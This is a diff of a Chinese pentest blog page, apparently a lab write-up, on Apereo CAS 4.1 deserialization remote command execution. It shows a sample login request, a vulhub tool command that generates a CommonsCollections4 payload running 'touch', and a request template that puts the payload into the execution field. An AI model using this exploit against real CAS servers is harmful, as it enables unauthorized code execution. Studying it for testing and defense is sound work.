@@ -20,17 +20,24 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":{"home":"/","about":"/about","tags":"/tags","resources":"/resources","categories":"/categories","schedule":"/schedule"}},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="健康 规律 技能">
-<meta property="og:type" content="website">
-<meta property="og:title" content="小乱的Blog">
-<meta property="og:url" content="http://example.com/source/categories/1-%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/index.html">
+  <meta name="description" content="参考资料https:&#x2F;&#x2F;www.wangan.com&#x2F;docs&#x2F;1734 漏洞测试Apereo cas 4.1版本 界面如下  路径中存在&#x2F;cas&#x2F;login 报文请求体格式与如下类似 1username&#x3D;test&amp;password&#x3D;test&amp;lt&#x3D;LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&amp;amp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="apereo cas 4.1反序列化命令执行">
+<meta property="og:url" content="http://example.com/2022/08/25/apereo-cas-4-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
 <meta property="og:site_name" content="小乱的Blog">
-<meta property="og:description" content="健康 规律 技能">
+<meta property="og:description" content="参考资料https:&#x2F;&#x2F;www.wangan.com&#x2F;docs&#x2F;1734 漏洞测试Apereo cas 4.1版本 界面如下  路径中存在&#x2F;cas&#x2F;login 报文请求体格式与如下类似 1username&#x3D;test&amp;password&#x3D;test&amp;lt&#x3D;LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&amp;amp">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208251036188.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208251041369.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208251043276.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208251044778.png">
+<meta property="article:published_time" content="2022-08-25T02:35:01.000Z">
+<meta property="article:modified_time" content="2022-08-25T02:44:44.823Z">
 <meta property="article:author" content="xiaoluan">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208251036188.png">
 
-<link rel="canonical" href="http://example.com/source/categories/1-%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/">
+<link rel="canonical" href="http://example.com/2022/08/25/apereo-cas-4-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
 
 
 <script id="page-configurations">
@@ -38,12 +45,12 @@
   CONFIG.page = {
     sidebar: "",
     isHome : false,
-    isPost : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>分类: 1.环境部署 | 小乱的Blog</title>
+  <title>apereo cas 4.1反序列化命令执行 | 小乱的Blog</title>
   
 
 
@@ -194,120 +201,128 @@
         <div class="content-wrap">
           
 
-          <div class="content category">
+          <div class="content post posts-expand">
             
 
+    
   
   
-  
-  <div class="post-block">
-    <div class="posts-collapse">
-      <div class="collection-title">
-        <h2 class="collection-header">1.环境部署
-          <small>分类</small>
-        </h2>
-      </div>
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/25/apereo-cas-4-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="xiaoluan">
+      <meta itemprop="description" content="健康 规律 技能">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小乱的Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          apereo cas 4.1反序列化命令执行
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-08-25 10:35:01 / 修改时间：10:44:44" itemprop="dateCreated datePublished" datetime="2022-08-25T10:35:01+08:00">2022-08-25</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E5%A4%96%E5%9B%B4%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">1.外围渗透</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E5%A4%96%E5%9B%B4%E6%B8%97%E9%80%8F/3-%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">3.已知漏洞</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-    <div class="collection-year">
-      <span class="collection-header">2022</span>
-    </div>
+        <h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a target="_blank" rel="noopener" href="https://www.wangan.com/docs/1734">https://www.wangan.com/docs/1734</a></p>
+<h3 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><p>Apereo cas 4.1版本</p>
+<p>界面如下</p>
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208251036188.png" alt="image-20220825103635867"></p>
+<p>路径中存在&#x2F;cas&#x2F;login</p>
+<p>报文请求体格式与如下类似</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=test&amp;password=test&amp;lt=LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&amp;execution=4872439b-d35f-40f9-8e13-2e33170209c6_AAAAIgAAABCWEo6T1hi8u7IwNg7YLXouAAAABmFlczEyOBqIX66ekThiP0N97P7GaoxxvkzIkvgh5LR7XttaGE1Wo45W%2BktFFOlQueVht2oBUsiC%2BrdThsJklHSFl6zT3siwVlm5dtKAaT3vYoheWhycgs1t7hEY%2FsJnSKbLZNN7%2Fe9tm2MX8s0aqBODOCIH4KSNhO6aWwzBwaAFcwYrcoFF60nVtqVKUKWUKzIsFbmcymERRdRMVsZzl4flvXtzkSG254%2Fg9DpMPkuPUJy1%2BX2WE2FjMlPsa8Z23cZUw4P9Oc51ZAMzyWzZzFg5PhPTqFgqZQmW3nXDJyANhTT6n8eTQlKEyY5qN%2F5jS4cOIskZBGemgeeORMvFZELogFJTKZfCH%2FhcA13EtbI%2Fa1kum4ykkkqxKv%2BQAo4x7Wi2dw7ji7myvDNexH3al6lYNE4QJs%2Bmz6C5nbfRkMZQklDXKXIBkm%2BuOeH1JoV91kgNL2ffj8yM%2BuJWQvxBlsc7FWiApCxcqAprnM%2FDVZBes3q%2BtrpMPC2TEJNo6ieylIJd1KJWoDn%2FhvyWJpe522m0sHT7JOOQ%2FQ3q4NWmedTCeEFn9b0XHoqb0WsjyEenH3EN%2FYS2XFfBeZnr%2BJPOzucUs7taxVKeJ%2Ffd82uWsL5GqATXCwQkEJiYCsxJYocwl0XvP4pcSZFr1KjWpgLeflpycQ2aNwvg0VYSQKZowXVp%2BM5g2SMwrX40KjjNXTttm4uptk3vxbZrM%2FgR3%2FG8Aj%2BxuJpNFwAth0ZnNxrncowXyakfWKk2aODUZXV7BYY%2FXXeOTKedwMK9jUYIB65cBNwphhHJnY7xAkas%2Bch93pG%2BJf9JhqSfW%2FkjOy%2FJ01annS2JdT9lS0R5N5%2FlkYxtY0WByuJ4YESNfteEPjwPS7ov9P8KoNpmPWOYcEX7Epab9fDcDM01%2Bm4D9AnYq3BUfqhjzqgHynbYPtGrbrDE%2FTODhRLkaRFjM4X%2BF4oUerZK7hX3efFxfajYljjYQS6G5Bkqq8GfiJ1trhVXCPGSZkKHB7kaSQldkY9atl4wM4hZEikZyTucZVG2U%2BTGlcmqWXt%2FrfcFay3ECcebNjZ8iacSzEOgyjf6j7zQxyv9YxExRzHYWzcw0G89cFwWfoI0vrSANsp2w7RZnyAplRNzlve3F8ocBjHqPwC0jXeyWsFFYr8DpgJF1a4bUyxxFXKpmiX0j2fU3d4ziiNT7sE0jO8OPX5USp0Oi1H57IK98kIWLrOQW%2FbAWt6hwG%2Ff1yRJQu74urJKpRyqe8%2Fnkx4PwRkXXFuSGdFpYaEGw01jM18VhqfqD61iHrm62rE%2BLnFdyoSFEmcg7wzzga6NN4SKNJlkeOspDHOEy9DODjcB0cZIDzG4jJ%2Fzynkzjv4jzB1OgEbkoFKx2UmeaDaB1j4Awaq0ec154u%2BPXi92EBY0trg3KWM2CFnbRPdQcIPauKap58b2MFtnE7b%2B2X4YDN%2FKDKNqwPH59nbG6%2F3ovuZ3Ss1j4QhSzFLrfuoDnq768Wn4rAfB3VyQgiWELwNlzoZMbV5WBRt43peLSDyGetsskR0NwRKNp0WWbUNkBL0VHSPZwMGewlAXvwVDsKlBjBU3Rhx63WzBRc8X%2BcIE345CsiI%2B0gAWrKBHCn%2BwLcfvCHl%2B3nOPYK%2Fkse%2F7x8NlgYY2h0LLwByITCxfCkMgd8eqJ1rRspvZIQNf05Ofw0pk%2BUGtC%2FdjQ9binpyj6uQPa4d7593VMGI5FRj%2B4yZsdT6C9FSVBJShLg6jxx25KvkaZXf3kdk8Fssl1S1t4jhN1jNy1WsrfAoWFg%2FTe7y5d8JuPTqsUpyBuL7sa%2BMwD2Z6P0Rb%2FRkIkZU9jdNdf4QqrEU6ESSHaa7u0gQuQqkg5zA7j55Hblr%2F9zS6sDwZfEr8vERNDxl7YBakZD%2FMKR%2Fzxq%2FmExTV3prcidrFO7dKuQJMpnVXHdKbqU8Q5FW%2Beg2Phdfe0L%2F3Y07v0s9OrPtSTAAcL%2FFAwqbIKQtFe1gMUDwFfWYWc3En7YoNBw%3D%3D&amp;_eventId=submit&amp;submit=LOGIN</span><br></pre></td></tr></table></figure>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>payload生成工具</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/Apereo-CAS-Attack">https://github.com/vulhub/Apereo-CAS-Attack</a></p>
+<p>使用命令生成payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 &quot;touch /tmp/success133579&quot;</span><br></pre></td></tr></table></figure>
 
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-07-28T15:16:08+08:00"
-              content="2022-07-28">
-          07-28
-        </time>
-      </div>
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208251041369.png"></p>
+<p>将生成的编码替换到execution的值中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=test&amp;password=test&amp;lt=LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&amp;execution=[payload]&amp;_eventId=submit&amp;submit=LOGIN</span><br></pre></td></tr></table></figure>
 
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/07/28/MacOS-VMwareFusion%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/" itemprop="url">
-            <span itemprop="name">MacOS&VMwareFusion红日靶场搭建</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-07-28T10:02:40+08:00"
-              content="2022-07-28">
-          07-28
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/07/28/VMwareFusion%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/" itemprop="url">
-            <span itemprop="name">VMwareFusion网络配置</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-07-21T16:26:13+08:00"
-              content="2022-07-21">
-          07-21
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/07/21/mattermost%E9%83%A8%E7%BD%B2/" itemprop="url">
-            <span itemprop="name">mattermost部署</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-    <div class="collection-year">
-      <span class="collection-header">2021</span>
-    </div>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2021-11-18T16:47:52+08:00"
-              content="2021-11-18">
-          11-18
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2021/11/18/Docker%E5%9F%BA%E7%A1%80/" itemprop="url">
-            <span itemprop="name">Docker基础</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
+<p>执行效果</p>
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208251043276.png" alt="image-20220825104347109"></p>
+<p>靶机中成功生成了success133579文件</p>
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202208251044778.png" alt="image-20220825104424231"></p>
 
     </div>
-  </div>
-  
-  
-  
 
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/08/18/%E8%BF%90%E7%94%A8%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7%E5%9C%A8%E5%86%85%E7%BD%91%E8%BE%BE%E5%88%B0dnslog%E6%95%88%E6%9E%9C/" rel="prev" title="运用抓包工具在内网达到dnslog效果">
+      <i class="fa fa-chevron-left"></i> 运用抓包工具在内网达到dnslog效果
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
   
 
 
 
           </div>
           
+    
+  <div class="comments">
+    <div id="lv-container" data-id="city" data-uid="MTAyMC81MzU2MC8zMDAzMw=="></div>
+  </div>
+  
 
 <script>
   window.addEventListener('tabs:register', () => {
@@ -354,6 +369,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-number">1.</span> <span class="nav-text">参考资料</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95"><span class="nav-number">2.</span> <span class="nav-text">漏洞测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -521,6 +537,21 @@ $(document).ready(function() {
 
   
 
+<script>
+NexT.utils.loadComments(document.querySelector('#lv-container'), () => {
+  window.livereOptions = {
+    refer: location.pathname.replace(CONFIG.root, '').replace('index.html', '')
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+});
+</script>
 
 </body>
 </html>
